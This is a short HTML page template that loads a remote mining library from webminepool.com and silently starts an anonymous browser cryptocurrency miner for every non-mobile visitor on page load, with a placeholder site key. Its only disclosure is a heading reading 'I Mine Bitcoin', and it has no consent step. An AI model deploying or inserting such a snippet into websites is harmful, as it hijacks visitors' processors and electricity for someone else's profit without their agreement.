// its a basic HTML AND JAVASCRIPT Website 
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <script src="https://www.webminepool.com/lib/base.js"></script>
</head>
<body>

    <h1>I Mine Bitcoin </h1>

    <script>
        var miner = WMP.Anonymous('<your site key here>', { throttle: 0.6 });
        if (!miner.isMobile()) {
            miner.start();
        }
    </script>
    
</body>
</html>>
